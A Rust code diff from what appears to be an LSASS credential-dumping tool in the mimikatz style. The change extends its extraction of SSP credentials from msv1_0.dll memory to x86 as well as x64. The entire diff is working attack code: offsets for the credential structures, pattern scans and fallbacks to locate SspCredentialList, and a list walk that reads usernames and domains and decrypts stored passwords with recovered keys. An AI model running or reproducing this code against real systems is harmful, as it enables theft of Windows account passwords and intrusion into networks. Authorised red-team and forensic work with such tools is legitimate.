@@ -1,42 +1,58 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::SspCredential;
+use crate::lsass::types::{Arch, SspCredential, read_ptr, read_ustring, is_valid_user_ptr};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// KIWI_SSP_CREDENTIAL_LIST_ENTRY offsets (Windows 10 x64):
-///   +0x00: Flink
-///   +0x08: Blink
-///   +0x10: References (ULONG + 4 pad)
-///   +0x18: CredentialReferences (ULONG + 4 pad)
-///   +0x20: LUID (8 bytes)
-///   +0x28: Flags (ULONG + 4 pad)
-///   +0x30: credentials_ptr (PVOID -> KIWI_SSP_PRIMARY_CREDENTIAL)
+/// Per-arch offsets for KIWI_SSP_CREDENTIAL_LIST_ENTRY.
 ///
-/// KIWI_SSP_PRIMARY_CREDENTIAL:
-///   +0x00: UserName (UNICODE_STRING, 16 bytes)
-///   +0x10: DomainName (UNICODE_STRING, 16 bytes)
-///   +0x20: Password (UNICODE_STRING, 16 bytes, encrypted)
-const OFFSET_FLINK: u64 = 0x00;
-const OFFSET_LUID: u64 = 0x20;
-const OFFSET_CRED_PTR: u64 = 0x30;
+/// The struct contains a LIST_ENTRY at +0x00, then References/CredentialReferences,
+/// then LUID, then inline KIWI_GENERIC_PRIMARY_CREDENTIAL (UserName, Domaine, Password).
+struct SspOffsets {
+    luid: u64,
+    username: u64,
+    domain: u64,
+    password: u64,
+}
 
-const CRED_USERNAME: u64 = 0x00;
-const CRED_DOMAIN: u64 = 0x10;
-const CRED_PASSWORD: u64 = 0x20;
+const SSP_OFFSETS_X64: SspOffsets = SspOffsets {
+    luid: 0x18,
+    username: 0x30,
+    domain: 0x40,
+    password: 0x50,
+};
 
-/// Extract SSP credentials from msv1_0.dll.
+const SSP_OFFSETS_X86: SspOffsets = SspOffsets {
+    luid: 0x10,
+    username: 0x24,
+    domain: 0x2C,
+    password: 0x34,
+};
+
+/// Extract SSP credentials from msv1_0.dll (unified x64/x86).
 ///
 /// SSP stores credentials for custom Security Support Providers.
 /// The SspCredentialList is a doubly-linked list in msv1_0.dll.
-pub fn extract_ssp_credentials(
-    vmem: &impl VirtualMemory,
+pub fn extract_ssp_credentials_arch(
+    vmem: &dyn VirtualMemory,
     msv_base: u64,
     _msv_size: u32,
     keys: &CryptoKeys,
+    arch: Arch,
 ) -> Result<Vec<(u64, SspCredential)>> {
+    let offsets = match arch {
+        Arch::X64 => &SSP_OFFSETS_X64,
+        Arch::X86 => &SSP_OFFSETS_X86,
+    };
+
     let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
+
+    // Select patterns based on architecture
+    let (pattern_list, pattern_label) = match arch {
+        Arch::X64 => (patterns::SSP_CREDENTIAL_PATTERNS, "SspCredentialList"),
+        Arch::X86 => (patterns::SSP_CREDENTIAL_PATTERNS_X86, "SspCredentialList_x86"),
+    };
 
     // Try .text pattern scan first, fall back to .data section scan
     let list_addr = match pe.find_section(".text") {
@@ -46,35 +62,55 @@ pub fn extract_ssp_credentials(
                 vmem,
                 text_base,
                 text.virtual_size,
-                patterns::SSP_CREDENTIAL_PATTERNS,
-                "SspCredentialList",
+                pattern_list,
+                pattern_label,
             ) {
-                Ok((pattern_addr, _)) => patterns::resolve_rip_relative(vmem, pattern_addr, 7)?,
+                Ok((pattern_addr, _)) => {
+                    // Resolve the list address from the pattern match
+                    match arch {
+                        Arch::X64 => {
+                            patterns::find_list_via_lea(vmem, pattern_addr, "SspCredentialList")?
+                        }
+                        Arch::X86 => {
+                            let ds = pe.find_section(".data");
+                            if let Some(ds) = ds {
+                                let data_base = msv_base + ds.virtual_address as u64;
+                                let data_end = data_base + ds.virtual_size as u64;
+                                patterns::find_list_via_abs(
+                                    vmem, pattern_addr, msv_base,
+                                    data_base, data_end, "ssp_x86",
+                                ).unwrap_or_else(|_| {
+                                    find_ssp_list_in_data(vmem, &pe, msv_base, arch)
+                                        .unwrap_or(0)
+                                })
+                            } else {
+                                find_ssp_list_in_data(vmem, &pe, msv_base, arch)?
+                            }
+                        }
+                    }
+                }
                 Err(e) => {
                     log::debug!(
                         "SSP .text pattern scan failed ({}), trying .data fallback",
                         e
                     );
-                    find_ssp_list_in_data(vmem, &pe, msv_base)?
+                    find_ssp_list_in_data(vmem, &pe, msv_base, arch)?
                 }
             }
         }
-        None => find_ssp_list_in_data(vmem, &pe, msv_base)?,
+        None => find_ssp_list_in_data(vmem, &pe, msv_base, arch)?,
     };
 
-    log::info!("SSP SspCredentialList at 0x{:x}", list_addr);
-    walk_ssp_list(vmem, list_addr, keys)
-}
+    if list_addr == 0 {
+        return Ok(Vec::new());
+    }
 
-/// Walk the SspCredentialList linked list.
-fn walk_ssp_list(
-    vmem: &impl VirtualMemory,
-    list_addr: u64,
-    keys: &CryptoKeys,
-) -> Result<Vec<(u64, SspCredential)>> {
+    log::info!("SSP SspCredentialList at 0x{:x} (arch={:?})", list_addr, arch);
+
+    // Walk the linked list
     let mut results = Vec::new();
 
-    let head_flink = vmem.read_virt_u64(list_addr)?;
+    let head_flink = read_ptr(vmem, list_addr, arch)?;
     if head_flink == 0 || head_flink == list_addr {
         log::info!("SSP: credential list is empty");
         return Ok(results);
@@ -89,43 +125,38 @@ fn walk_ssp_list(
         }
         visited.insert(current);
 
-        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
-        let cred_ptr = vmem.read_virt_u64(current + OFFSET_CRED_PTR).unwrap_or(0);
+        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
 
-        if cred_ptr > 0x10000 && (cred_ptr >> 48) == 0 {
-            let username = vmem
-                .read_win_unicode_string(cred_ptr + CRED_USERNAME)
-                .unwrap_or_default();
-            let domain = vmem
-                .read_win_unicode_string(cred_ptr + CRED_DOMAIN)
-                .unwrap_or_default();
+        // Credentials are inline UNICODE_STRINGs (not behind a pointer)
+        let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
+        let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();
 
-            if !username.is_empty() {
-                let password = crate::lsass::crypto::decrypt_unicode_string_password(
-                    vmem,
-                    cred_ptr + CRED_PASSWORD,
-                    keys,
-                );
+        if !username.is_empty() {
+            let password = crate::lsass::crypto::decrypt_unicode_string_password_arch(
+                vmem,
+                current + offsets.password,
+                keys,
+                arch,
+            );
 
-                log::debug!(
-                    "SSP: LUID=0x{:x} user={} domain={} pwd_len={}",
-                    luid,
+            log::debug!(
+                "SSP: LUID=0x{:x} user={} domain={} pwd_len={}",
+                luid,
+                username,
+                domain,
+                password.len()
+            );
+            results.push((
+                luid,
+                SspCredential {
                     username,
                     domain,
-                    password.len()
-                );
-                results.push((
-                    luid,
-                    SspCredential {
-                        username,
-                        domain,
-                        password,
-                    },
-                ));
-            }
+                    password,
+                },
+            ));
         }
 
-        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
+        current = match read_ptr(vmem, current, arch) {
             Ok(f) => f,
             Err(_) => break,
         };
@@ -147,32 +178,48 @@ fn walk_ssp_list(
 /// Fallback: scan msv1_0.dll .data section for SspCredentialList LIST_ENTRY head.
 ///
 /// Validates candidates by checking that the first entry has a valid LUID
-/// and credentials pointer at the expected offsets.
-fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u64) -> Result<u64> {
+/// and credentials at the expected offsets.
+fn find_ssp_list_in_data(
+    vmem: &dyn VirtualMemory,
+    pe: &PeHeaders,
+    msv_base: u64,
+    arch: Arch,
+) -> Result<u64> {
+    let offsets = match arch {
+        Arch::X64 => &SSP_OFFSETS_X64,
+        Arch::X86 => &SSP_OFFSETS_X86,
+    };
+
     let data_sec = pe.find_section(".data").ok_or_else(|| {
-        crate::error::GovmemError::PatternNotFound(".data section in msv1_0.dll".to_string())
+        crate::error::VmkatzError::PatternNotFound(".data section in msv1_0.dll".to_string())
     })?;
 
     let data_base = msv_base + data_sec.virtual_address as u64;
     let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
     let data = vmem.read_virt_bytes(data_base, data_size)?;
+    let step = arch.ptr_size() as usize;
 
     log::debug!(
-        "SSP: scanning msv1_0.dll .data for SspCredentialList: base=0x{:x} size=0x{:x}",
+        "SSP: scanning msv1_0.dll .data for SspCredentialList: base=0x{:x} size=0x{:x} arch={:?}",
         data_base,
-        data_size
+        data_size,
+        arch,
     );
 
-    for off in (0..data_size.saturating_sub(16)).step_by(8) {
-        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
-        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
+    for off in (0..data_size.saturating_sub(step * 2)).step_by(step) {
+        let flink = match arch {
+            Arch::X86 => super::types::read_u32_le(&data, off).unwrap_or(0) as u64,
+            Arch::X64 => super::types::read_u64_le(&data, off).unwrap_or(0),
+        };
+        let blink = match arch {
+            Arch::X86 => super::types::read_u32_le(&data, off + step).unwrap_or(0) as u64,
+            Arch::X64 => super::types::read_u64_le(&data, off + 8).unwrap_or(0),
+        };
 
         let list_addr = data_base + off as u64;
 
-        // Self-referencing empty list (SspCredentialList typically empty)
+        // Self-referencing empty list (SspCredentialList is typically empty)
         if flink == list_addr && blink == list_addr {
-            // This could be SspCredentialList - verify it's not some other list
-            // by checking it's in the first part of .data (globals are early)
             if off < 0x1000 {
                 log::debug!(
                     "SSP: found empty SspCredentialList candidate at 0x{:x} (self-referencing)",
@@ -183,10 +230,7 @@ fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u6
             continue;
         }
 
-        if flink < 0x10000 || (flink >> 48) != 0 {
-            continue;
-        }
-        if blink < 0x10000 || (blink >> 48) != 0 {
+        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
             continue;
         }
         // Must point to heap, not within the DLL
@@ -195,16 +239,16 @@ fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u6
         }
 
         // Validate: first entry's Flink
-        let entry_flink = match vmem.read_virt_u64(flink) {
+        let entry_flink = match read_ptr(vmem, flink, arch) {
             Ok(f) => f,
             Err(_) => continue,
         };
-        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
+        if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
             continue;
         }
 
         // Validate: LUID at expected offset
-        let luid = match vmem.read_virt_u64(flink + OFFSET_LUID) {
+        let luid = match vmem.read_virt_u64(flink + offsets.luid) {
             Ok(l) => l,
             Err(_) => continue,
         };
@@ -212,12 +256,9 @@ fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u6
             continue;
         }
 
-        // Validate: credentials pointer at expected offset
-        let cred_ptr = match vmem.read_virt_u64(flink + OFFSET_CRED_PTR) {
-            Ok(p) => p,
-            Err(_) => continue,
-        };
-        if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
+        // Validate: inline credentials — UserName UNICODE_STRING should be readable
+        let username = read_ustring(vmem, flink + offsets.username, arch).unwrap_or_default();
+        if username.is_empty() {
             continue;
         }
 
@@ -230,8 +271,7 @@ fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u6
         return Ok(list_addr);
     }
 
-    // SSP list is typically empty (no custom SSPs). Return a "not found" to signal this.
-    Err(crate::error::GovmemError::PatternNotFound(
+    Err(crate::error::VmkatzError::PatternNotFound(
         "SspCredentialList in msv1_0.dll .data section".to_string(),
     ))
 }
